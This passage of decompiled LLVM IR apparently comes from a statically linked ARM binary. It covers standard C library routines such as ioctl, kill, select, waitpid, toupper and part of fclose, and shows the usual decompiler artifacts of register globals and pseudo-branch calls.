  store i32 %v0_ab64, i32* @r7, align 4
  br label %dec_label_pc_ab88

bb16:                                             ; preds = %dec_label_pc_ab64
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_ab88

dec_label_pc_ab78:                                ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_ab40, label %dec_label_pc_ab88, label %dec_label_pc_ab9c

dec_label_pc_ab88:                                ; preds = %dec_label_pc_ab78, %bb, %bb16
  %v0_ab88 = phi i32 [ %v0_ab64, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_ab78 ]
  %v1_ab8c = call i32 @malloc(i32 %v0_ab88)
  %v2_ab90 = icmp eq i32 %v1_ab8c, 0
  br i1 %v2_ab90, label %dec_label_pc_ac10, label %dec_label_pc_ab9c

dec_label_pc_ab9c:                                ; preds = %dec_label_pc_ab88, %dec_label_pc_ab78
  %storemerge = phi i32 [ %arg1, %dec_label_pc_ab78 ], [ %v1_ab8c, %dec_label_pc_ab88 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 183, i32* @r7, align 4
  store i32 %storemerge, i32* @r1, align 4
  %tmp = icmp ult i32 %storemerge, -4095
  br i1 %tmp, label %dec_label_pc_abd0, label %dec_label_pc_abb8

dec_label_pc_abb8:                                ; preds = %dec_label_pc_ab9c
  %v0_abbc = call i32 @__aeabi_read_tp()
  %v3_abc0 = load i16, i16* @global_var_24070.401, align 2
  %v4_abc0 = sext i16 %v3_abc0 to i32
  %v0_abc4 = load i32, i32* @r1, align 4
  %v1_abc4 = sub i32 0, %v0_abc4
  %v3_abc8 = add i32 %v4_abc0, %v0_abbc
  %v4_abc8 = inttoptr i32 %v3_abc8 to i32*
  store i32 %v1_abc4, i32* %v4_abc8, align 4
  br label %dec_label_pc_abfc

dec_label_pc_abd0:                                ; preds = %dec_label_pc_ab9c
  %v1_abd0 = icmp slt i32 %storemerge, 0
  br i1 %v1_abd0, label %dec_label_pc_abfc, label %dec_label_pc_abd8

dec_label_pc_abd8:                                ; preds = %dec_label_pc_abd0
  %v0_abd8 = load i32, i32* @r4, align 4
  %v2_abd8 = icmp eq i32 %v0_abd8, 0
  br i1 %v2_abd8, label %bb18, label %dec_label_pc_abf0.thread7

dec_label_pc_abf0.thread7:                        ; preds = %dec_label_pc_abd8
  br label %dec_label_pc_ac14

bb18:                                             ; preds = %dec_label_pc_abd8
  %v1_abdc = load i32, i32* @r6, align 4
  %v3_abdc = icmp eq i32 %v1_abdc, 0
  br i1 %v3_abdc, label %dec_label_pc_abf0, label %dec_label_pc_abf0.thread

dec_label_pc_abf0.thread:                         ; preds = %bb18
  br label %bb19

dec_label_pc_abf0:                                ; preds = %bb18
  %v1_abe8 = inttoptr i32 %storemerge to i32*
  %v2_abe8 = call i32 @realloc(i32* %v1_abe8)
  store i32 %v2_abe8, i32* @r4, align 4
  %v2_abf0 = icmp eq i32 %v2_abe8, 0
  br i1 %v2_abf0, label %dec_label_pc_abf0.bb19_crit_edge, label %dec_label_pc_ac14

dec_label_pc_abf0.bb19_crit_edge:                 ; preds = %dec_label_pc_abf0
  %v1_abf4.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_abf0.bb19_crit_edge, %dec_label_pc_abf0.thread
  %v1_abf4 = phi i32 [ %v1_abf4.pre, %dec_label_pc_abf0.bb19_crit_edge ], [ %storemerge, %dec_label_pc_abf0.thread ]
  store i32 %v1_abf4, i32* @r4, align 4
  br label %dec_label_pc_ac14

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abd0, %dec_label_pc_abb8
  %v0_abfc = load i32, i32* @r4, align 4
  %v2_abfc = icmp eq i32 %v0_abfc, 0
  br i1 %v2_abfc, label %dec_label_pc_ac04, label %dec_label_pc_ac10

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abfc
  %v0_ac04 = load i32, i32* @r5, align 4
  store i32 %v0_ac04, i32* @r0, align 4
  %v0_ac08 = call i32 @free()
  br label %dec_label_pc_ac14

dec_label_pc_ac10:                                ; preds = %dec_label_pc_abfc, %dec_label_pc_ab88
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_ac14

dec_label_pc_ac14:                                ; preds = %dec_label_pc_abf0.thread7, %bb19, %dec_label_pc_abf0, %dec_label_pc_ac04, %dec_label_pc_ab48, %dec_label_pc_ac10
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v3_ab2c, i32* @r4, align 4
  store i32 %v6_ab2c, i32* @r5, align 4
  store i32 %v9_ab2c, i32* @r6, align 4
  store i32 %v12_ab2c, i32* @r7, align 4
  ret i32 %v0_ac14

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 4, 3, 0, 2, 5 }
  uselistorder i32 %v0_ab64, { 0, 2, 1 }
  uselistorder label %dec_label_pc_ac14, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_ab88, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_ac38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 156) to i32*), align 4
  %v1_ac3c = inttoptr i32 %v4_ac38 to i32*
  %v2_ac3c = load i32, i32* %v1_ac3c, align 4
  %v2_ac40 = icmp eq i32 %v2_ac3c, 0
  br i1 %v2_ac40, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_ac48 = phi i32 [ %v2_ac3c, %entry ], [ 4096, %bb ]
  ret i32 %v1_ac48

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_ac64 = load i32, i32* @r0, align 4
  ret i32 %v1_ac64
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_ac68 = load i32, i32* @r3, align 4
  store i32 %v9_ac68, i32* %stack_var_-4, align 4
  %v3_ac6c = load i32, i32* @r4, align 4
  store i32 %v3_ac6c, i32* %stack_var_-32, align 4
  %v6_ac6c = load i32, i32* @r5, align 4
  %v12_ac6c = load i32, i32* @r7, align 4
  %v4_ac7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_ac84 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ac84, i32* @r3, align 4
  %v2_ac88 = icmp eq i32 %v4_ac7c, 0
  %v0_ac90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ac90, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_ac88, label %dec_label_pc_aca0, label %dec_label_pc_acd8

dec_label_pc_aca0:                                ; preds = %entry
  %tmp = icmp ult i32 %v0_ac90, -4095
  br i1 %tmp, label %dec_label_pc_acd0, label %dec_label_pc_acb8

dec_label_pc_acb8:                                ; preds = %dec_label_pc_aca0
  %v1_acbc = sub i32 0, %v0_ac90
  %v3_acc0 = load i16, i16* @global_var_24070.401, align 2
  %v4_acc0 = sext i16 %v3_acc0 to i32
  store i32 %v4_acc0, i32* @r3, align 4
  %v0_acc4 = call i32 @__aeabi_read_tp()
  %v2_acc8 = load i32, i32* @r3, align 4
  %v3_acc8 = add i32 %v2_acc8, %v0_acc4
  %v4_acc8 = inttoptr i32 %v3_acc8 to i32*
  store i32 %v1_acbc, i32* %v4_acc8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_acd0

dec_label_pc_acd0:                                ; preds = %dec_label_pc_aca0, %dec_label_pc_acb8
  %v0_acd0 = phi i32 [ %v0_ac90, %dec_label_pc_aca0 ], [ -1, %dec_label_pc_acb8 ]
  br label %dec_label_pc_ad24

dec_label_pc_acd8:                                ; preds = %entry
  %v0_acd8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_acd8, i32* %r6.global-to-local, align 4
  %v0_ace8 = load i32, i32* @r4, align 4
  store i32 %v0_ace8, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_ace8, -4095
  br i1 %tmp15, label %dec_label_pc_ad18, label %dec_label_pc_ad00

dec_label_pc_ad00:                                ; preds = %dec_label_pc_acd8
  %v1_ad04 = sub i32 0, %v0_ace8
  %v3_ad08 = load i16, i16* @global_var_24070.401, align 2
  %v4_ad08 = sext i16 %v3_ad08 to i32
  store i32 %v4_ad08, i32* @r3, align 4
  %v0_ad0c = call i32 @__aeabi_read_tp()
  store i32 %v0_ad0c, i32* %r0.global-to-local, align 4
  %v2_ad10 = load i32, i32* @r3, align 4
  %v3_ad10 = add i32 %v2_ad10, %v0_ad0c
  %v4_ad10 = inttoptr i32 %v3_ad10 to i32*
  store i32 %v1_ad04, i32* %v4_ad10, align 4
  %v0_ad18.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ad18

dec_label_pc_ad18:                                ; preds = %dec_label_pc_acd8, %dec_label_pc_ad00
  %v0_ad1c = phi i32 [ %v0_ace8, %dec_label_pc_acd8 ], [ -1, %dec_label_pc_ad00 ]
  %v0_ad18 = phi i32 [ %v0_acd8, %dec_label_pc_acd8 ], [ %v0_ad18.pre, %dec_label_pc_ad00 ]
  store i32 %v0_ad18, i32* %r0.global-to-local, align 4
  store i32 %v0_ad1c, i32* @r7, align 4
  %v1_ad20 = call i32 @__libc_disable_asynccancel(i32 %v0_ad18)
  store i32 %v1_ad20, i32* %r0.global-to-local, align 4
  %v0_ad24.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ad24

dec_label_pc_ad24:                                ; preds = %dec_label_pc_acd0, %dec_label_pc_ad18
  %v0_ad24 = phi i32 [ %v0_acd0, %dec_label_pc_acd0 ], [ %v0_ad24.pre, %dec_label_pc_ad18 ]
  store i32 %v0_ad24, i32* %r0.global-to-local, align 4
  %v2_ad2c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_ad2c, i32* @r4, align 4
  store i32 %v6_ac6c, i32* @r5, align 4
  store i32 %v12_ac6c, i32* @r7, align 4
  ret i32 %v0_ad24

; uselistorder directives
  uselistorder i32 %v0_ad24, { 1, 0 }
  uselistorder i32 %v0_ad18, { 1, 0 }
  uselistorder i32 %v0_ace8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_ac90, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_ad24, { 1, 0 }
  uselistorder label %dec_label_pc_ad18, { 1, 0 }
  uselistorder label %dec_label_pc_acd0, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ad48 = load i32, i32* @r7, align 4
  store i32 %v3_ad48, i32* %stack_var_-8, align 4
  %v0_ad54 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ad54, -4095
  br i1 %tmp, label %dec_label_pc_ad74, label %dec_label_pc_ad5c

dec_label_pc_ad5c:                                ; preds = %entry
  %v1_ad60 = sub i32 0, %v0_ad54
  %v3_ad64 = load i16, i16* @global_var_24070.401, align 2
  %v4_ad64 = sext i16 %v3_ad64 to i32
  %v0_ad68 = call i32 @__aeabi_read_tp()
  %v3_ad6c = add i32 %v4_ad64, %v0_ad68
  %v4_ad6c = inttoptr i32 %v3_ad6c to i32*
  store i32 %v1_ad60, i32* %v4_ad6c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_ad74.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ad74

dec_label_pc_ad74:                                ; preds = %entry, %dec_label_pc_ad5c
  %v1_ad78 = phi i32 [ %v0_ad54, %entry ], [ -1, %dec_label_pc_ad5c ]
  %v2_ad74 = phi i32 [ %v3_ad48, %entry ], [ %v2_ad74.pre, %dec_label_pc_ad5c ]
  store i32 %v2_ad74, i32* @r7, align 4
  ret i32 %v1_ad78

; uselistorder directives
  uselistorder i32 %v0_ad54, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ad74, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ad80 = load i32, i32* @r4, align 4
  store i32 %v3_ad80, i32* %stack_var_-12, align 4
  %v0_ad90 = load i32, i32* @r0, align 4
  store i32 %v0_ad90, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ad90, -4095
  br i1 %tmp, label %dec_label_pc_adb8, label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %entry
  %v0_ada4 = call i32 @__aeabi_read_tp()
  %v3_ada8 = load i16, i16* @global_var_24070.401, align 2
  %v4_ada8 = sext i16 %v3_ada8 to i32
  %v0_adac = load i32, i32* %r2.global-to-local, align 4
  %v1_adac = sub i32 0, %v0_adac
  store i32 %v1_adac, i32* %r2.global-to-local, align 4
  %v3_adb0 = add i32 %v4_ada8, %v0_ada4
  %v4_adb0 = inttoptr i32 %v3_adb0 to i32*
  store i32 %v1_adac, i32* %v4_adb0, align 4
  %v2_adb8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_adb8

dec_label_pc_adb8:                                ; preds = %entry, %dec_label_pc_ada0
  %v1_adbc = phi i32 [ %v0_ad90, %entry ], [ -1, %dec_label_pc_ada0 ]
  %v2_adb8 = phi i32 [ %v3_ad80, %entry ], [ %v2_adb8.pre, %dec_label_pc_ada0 ]
  store i32 %v2_adb8, i32* @r4, align 4
  ret i32 %v1_adbc

; uselistorder directives
  uselistorder i32 %v0_ad90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_adb8, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_adc4 = load i32, i32* @r4, align 4
  store i32 %v3_adc4, i32* %stack_var_-28, align 4
  %v6_adc4 = load i32, i32* @r5, align 4
  %v9_adc4 = load i32, i32* @r6, align 4
  %v12_adc4 = load i32, i32* @r7, align 4
  %v15_adc4 = load i32, i32* @r8, align 4
  %v18_adc4 = load i32, i32* @sl, align 4
  %v21_adc4 = load i32, i32* @lr, align 4
  %v4_add4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_addc = icmp eq i32 %v4_add4, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_addc, label %dec_label_pc_adf8, label %entry.dec_label_pc_ae04_crit_edge

entry.dec_label_pc_ae04_crit_edge:                ; preds = %entry
  br label %dec_label_pc_ae04

dec_label_pc_adf8:                                ; preds = %entry
  store i32 %v3_adc4, i32* @r4, align 4
  store i32 %v9_adc4, i32* @r6, align 4
  store i32 %v12_adc4, i32* @r7, align 4
  store i32 %v15_adc4, i32* @r8, align 4
  store i32 %v18_adc4, i32* %sl.global-to-local, align 4
  %v0_ae00 = call i32 @__syscall_select()
  br label %dec_label_pc_ae04

dec_label_pc_ae04:                                ; preds = %entry.dec_label_pc_ae04_crit_edge, %dec_label_pc_adf8
  %v0_ae04 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_ae04, i32* @r5, align 4
  %v0_ae18 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_ae18, i32* @r0, align 4
  %v0_ae20 = call i32 @__syscall_select()
  store i32 %v0_ae20, i32* @r4, align 4
  %v0_ae28 = load i32, i32* @r5, align 4
  %v1_ae2c = call i32 @__libc_disable_asynccancel(i32 %v0_ae28)
  %v0_ae30 = load i32, i32* @r4, align 4
  %v2_ae38 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_ae38, i32* @r4, align 4
  store i32 %v6_adc4, i32* @r5, align 4
  store i32 %v9_adc4, i32* @r6, align 4
  store i32 %v12_adc4, i32* @r7, align 4
  store i32 %v15_adc4, i32* @r8, align 4
  store i32 %v18_adc4, i32* @sl, align 4
  store i32 %v21_adc4, i32* @lr, align 4
  ret i32 %v0_ae30

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ae04, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_ae4c = ptrtoint i32* %stack_var_-16 to i32
  %v2_ae5c = call i32 @gettimeofday(i32 %v2_ae4c, i32 0)
  %v2_ae60 = load i32, i32* %stack_var_-16, align 4
  %v2_ae64 = icmp eq i32* %arg1, null
  br i1 %v2_ae64, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_ae60, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_ae60

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_ae7c = load i32, i32* @r4, align 4
  store i32 %v3_ae7c, i32* %stack_var_-20, align 4
  %v6_ae7c = load i32, i32* @r5, align 4
  %v9_ae7c = load i32, i32* @r6, align 4
  %v12_ae7c = load i32, i32* @r7, align 4
  %v4_ae88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  store i32 %v4_ae88, i32* @ip, align 4
  %v2_ae8c = icmp eq i32 %v4_ae88, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_ae8c, label %dec_label_pc_aea4, label %dec_label_pc_aeb4

dec_label_pc_aea4:                                ; preds = %entry
  %v4_aea8 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  br label %dec_label_pc_aedc

dec_label_pc_aeb4:                                ; preds = %entry
  %v0_aeb4 = call i32 @__libc_enable_asynccancel()
  %v0_aeb8 = load i32, i32* @r6, align 4
  store i32 %v0_aeb4, i32* @r4, align 4
  %v0_aec0 = load i32, i32* @r7, align 4
  %v0_aec4 = load i32, i32* @r5, align 4
  %v4_aecc = call i32 @wait4(i32 %v0_aec4, i32 %v0_aeb8, i32 %v0_aec0, i32 0)
  store i32 %v4_aecc, i32* @r5, align 4
  %v0_aed4 = load i32, i32* @r4, align 4
  %v1_aed8 = call i32 @__libc_disable_asynccancel(i32 %v0_aed4)
  %v0_aedc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_aedc

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aea4, %dec_label_pc_aeb4
  %v0_aedc = phi i32 [ %v4_aea8, %dec_label_pc_aea4 ], [ %v0_aedc.pre, %dec_label_pc_aeb4 ]
  %v2_aee4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_aee4, i32* @r4, align 4
  store i32 %v6_ae7c, i32* @r5, align 4
  store i32 %v9_ae7c, i32* @r6, align 4
  store i32 %v12_ae7c, i32* @r7, align 4
  ret i32 %v0_aedc

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_aedc, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_aef8 = add i32 %arg1, 128
  %v2_aefc = icmp ugt i32 %v1_aef8, 383
  %v0_af04 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_aefc, i32 %v0_af04)
  %v4_af0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 1284) to i32*), align 4
  %v2_af10 = mul i32 %arg1, 2
  %v2_af14 = add i32 %v4_af0c, %v2_af10
  %v3_af14 = inttoptr i32 %v2_af14 to i16*
  %v4_af14 = load i16, i16* %v3_af14, align 2
  %v6_af14 = sext i16 %v4_af14 to i32
  ret i32 %v6_af14
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_af24 = load i32, i32* @lr, align 4
  %v0_af2c = call i32 @__aeabi_read_tp()
  %v3_af30 = load i16, i16* @global_var_24070.401, align 2
  %v4_af30 = sext i16 %v3_af30 to i32
  %v2_af34 = add i32 %v4_af30, %v0_af2c
  store i32 %v0_af24, i32* @lr, align 4
  ret i32 %v2_af34
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_af44 = load i32, i32* @r4, align 4
  store i32 %v3_af44, i32* %stack_var_-36, align 4
  %v6_af44 = load i32, i32* @r5, align 4
  %v9_af44 = load i32, i32* @r6, align 4
  %v12_af44 = load i32, i32* @r7, align 4
  %v15_af44 = load i32, i32* @r8, align 4
  %v27_af44 = load i32, i32* @lr, align 4
  %v2_af48 = add i32 %tmp, 52
  %v3_af48 = inttoptr i32 %v2_af48 to i32*
  %v4_af48 = load i32, i32* %v3_af48, align 4
  store i32 %v4_af48, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_af50 = icmp eq i32 %v4_af48, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r8, align 4
  br i1 %v2_af50, label %dec_label_pc_af64, label %dec_label_pc_afc8

dec_label_pc_af64:                                ; preds = %entry
  %v0_af64 = call i32 @__aeabi_read_tp()
  store i32 %v0_af64, i32* %r0.global-to-local, align 4
  %v0_af68 = load i32, i32* @r5, align 4
  %v1_af68 = add i32 %v0_af68, 64
  %v2_af68 = inttoptr i32 %v1_af68 to i32*
  %v3_af68 = load i32, i32* %v2_af68, align 4
  store i32 %v3_af68, i32* %r3.global-to-local, align 4
  %v1_af6c = add i32 %v0_af64, -1168
  store i32 %v1_af6c, i32* @r6, align 4
  %v3_af70 = icmp uge i32 %v3_af68, %v1_af6c
  store i1 %v3_af70, i1* %cpsr_c.global-to-local, align 1
  %v9_af70 = icmp eq i32 %v3_af68, %v1_af6c
  br i1 %v9_af70, label %dec_label_pc_afbc, label %dec_label_pc_af78

dec_label_pc_af78:                                ; preds = %dec_label_pc_af64
  %v1_af78 = add i32 %v0_af68, 56
  store i32 %v1_af78, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_af78, i32* %r2.global-to-local, align 4
  %v0_af84 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_af84, i32* @r4, align 4
  %v1_af88115 = inttoptr i32 %v1_af78 to i32*
  %v2_af88116 = load i32, i32* %v1_af88115, align 4
  store i32 %v2_af88116, i32* %r3.global-to-local, align 4
  %v3_af8c118 = icmp uge i32 %v2_af88116, %v0_af84
  store i1 %v3_af8c118, i1* %cpsr_c.global-to-local, align 1
  %v9_af8c124 = icmp eq i32 %v2_af88116, %v0_af84
  br i1 %v9_af8c124, label %dec_label_pc_af94, label %dec_label_pc_afac

dec_label_pc_af94:                                ; preds = %dec_label_pc_af78, %dec_label_pc_af94.dec_label_pc_af88_crit_edge
  %v0_af94125 = phi i32 [ %v1_af8c.pre, %dec_label_pc_af94.dec_label_pc_af88_crit_edge ], [ %v0_af84, %dec_label_pc_af78 ]
  store i32 %v0_af94125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_afa4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_afa4, label %dec_label_pc_afa8, label %dec_label_pc_af94.dec_label_pc_af88_crit_edge

dec_label_pc_af94.dec_label_pc_af88_crit_edge:    ; preds = %dec_label_pc_af94
  %v0_af88.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_af8c.pre = load i32, i32* @r4, align 4
  %v1_af88 = inttoptr i32 %v0_af88.pre to i32*
  %v2_af88 = load i32, i32* %v1_af88, align 4
  store i32 %v2_af88, i32* %r3.global-to-local, align 4
  %v3_af8c = icmp uge i32 %v2_af88, %v1_af8c.pre
  store i1 %v3_af8c, i1* %cpsr_c.global-to-local, align 1
  %v9_af8c = icmp eq i32 %v2_af88, %v1_af8c.pre
  br i1 %v9_af8c, label %dec_label_pc_af94, label %dec_label_pc_afac

dec_label_pc_afa8:                                ; preds = %dec_label_pc_af94
  %v0_afa8 = load i32, i32* @r4, align 4
  store i32 %v0_afa8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_afac

dec_label_pc_afac:                                ; preds = %dec_label_pc_af78, %dec_label_pc_af94.dec_label_pc_af88_crit_edge, %dec_label_pc_afa8
  %v0_afac = phi i32 [ %v0_afa8, %dec_label_pc_afa8 ], [ %v2_af88116, %dec_label_pc_af78 ], [ %v2_af88, %dec_label_pc_af94.dec_label_pc_af88_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_afac = icmp eq i32 %v0_afac, 0
  br i1 %v2_afac, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_afac
  %v1_afb0 = load i32, i32* @r7, align 4
  store i32 %v1_afb0, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_afac, %bb
  %v1_afb4 = xor i1 %v2_afac, true
  call void @__pseudo_cond_branch(i1 %v1_afb4, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_afb8 = load i32, i32* @r6, align 4
  %v1_afb8 = load i32, i32* @r5, align 4
  %v2_afb8 = add i32 %v1_afb8, 64
  %v3_afb8 = inttoptr i32 %v2_afb8 to i32*
  store i32 %v0_afb8, i32* %v3_afb8, align 4
  %v0_afbc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_afbc

dec_label_pc_afbc:                                ; preds = %dec_label_pc_af64, %bb41
  %v0_afbc = phi i32 [ %v0_af68, %dec_label_pc_af64 ], [ %v0_afbc.pre, %bb41 ]
  %v1_afbc = add i32 %v0_afbc, 60
  %v2_afbc = inttoptr i32 %v1_afbc to i32*
  %v3_afbc = load i32, i32* %v2_afbc, align 4
  %v1_afc0 = add i32 %v3_afbc, 1
  store i32 %v1_afc0, i32* %r3.global-to-local, align 4
  store i32 %v1_afc0, i32* %v2_afbc, align 4
  %v0_afc8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_afc8

dec_label_pc_afc8:                                ; preds = %entry, %dec_label_pc_afbc
  %v1_afd0 = phi i32 [ %tmp, %entry ], [ %v0_afc8.pre, %dec_label_pc_afbc ]
  %v1_afc8 = inttoptr i32 %v1_afd0 to i16*
  %v2_afc8 = load i16, i16* %v1_afc8, align 2
  %v3_afc8 = zext i16 %v2_afc8 to i32
  store i32 %v3_afc8, i32* %r3.global-to-local, align 4
  %v1_afcc = and i32 %v3_afc8, 64
  %v2_afcc = icmp eq i32 %v1_afcc, 0
  br i1 %v2_afcc, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_afc8
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_afc8, %bb42
  %storemerge = phi i32 [ %v1_afd0, %bb42 ], [ %v1_afcc, %dec_label_pc_afc8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 45016, i32* @lr, align 4
  %v1_afd4 = xor i1 %v2_afcc, true
  call void @__pseudo_cond_branch(i1 %v1_afd4, i32 ptrtoint (i32* @global_var_d040.422 to i32))
  %v0_afd8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_afd8, i32* %fp.global-to-local, align 4
  %v0_afdc = load i32, i32* @r5, align 4
  %v1_afdc = add i32 %v0_afdc, 4
  %v2_afdc = inttoptr i32 %v1_afdc to i32*
  %v3_afdc = load i32, i32* %v2_afdc, align 4
  store i32 %v3_afdc, i32* %r0.global-to-local, align 4
  %v1_afe0 = call i32 @__GI___libc_close(i32 %v3_afdc)
  store i32 %v1_afe0, i32* %r0.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_afe8 = load i32, i32* @r8, align 4
  %v2_afe8 = add i32 %v0_afe8, 168
  %v3_afe8 = inttoptr i32 %v2_afe8 to i32*
  %v4_afe8 = load i32, i32* %v3_afe8, align 4
  store i32 %v4_afe8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_afec = icmp slt i32 %v1_afe0, 0
  br i1 %v1_afec, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_aff4 = add i32 %v4_afe8, 8
  %v2_aff4 = inttoptr i32 %v1_aff4 to i32*
  %v3_aff4 = load i32, i32* %v2_aff4, align 4
